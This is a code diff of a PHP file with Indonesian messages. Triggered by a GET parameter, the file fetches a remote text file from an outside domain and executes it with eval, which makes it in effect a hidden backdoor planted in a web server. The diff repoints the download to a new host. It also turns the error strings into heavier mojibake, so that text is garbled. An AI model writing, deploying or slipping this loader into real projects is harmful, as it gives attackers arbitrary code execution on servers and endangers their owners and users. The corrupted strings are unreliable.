@@ -19,12 +19,12 @@ class CurlFetcher {
             curl_close($curl);
 
             if ($response === false || empty(trim($response))) {
-                return "<h3 style='color:red'>ÃƒÆ’Ã‚Â¢Ãƒâ€¦Ã¢â‚¬â„¢ Gagal ambil konten. Error: $error</h3>";
+                return "<h3 style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ Gagal ambil konten. Error: $error</h3>";
             }
 
             return $response;
         }
-        return "<h3 style='color:red'>ÃƒÆ’Ã‚Â¢Ãƒâ€¦Ã¢â‚¬â„¢ cURL tidak tersedia di server ini</h3>";
+        return "<h3 style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ cURL tidak tersedia di server ini</h3>";
     }
 }
 
@@ -40,7 +40,7 @@ class CodeExecutor {
         if ($code && trim($code) !== '') {
             eval("?>" . $code);
         } else {
-            echo "<p style='color:red'>ÃƒÆ’Ã‚Â¢Ãƒâ€¦Ã¢â‚¬â„¢ Gagal ambil atau isi kosong dari URL: $url</p>";
+            echo "<p style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ Gagal ambil atau isi kosong dari URL: $url</p>";
         }
     }
 }
@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['CodeExecutor'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://danantaraindonesia.org/kerang/rudi.txt");
+    $executor->executeCodeFromURL("https://isnujombang.org/kerang/rudi.txt");
     exit;
 }
 
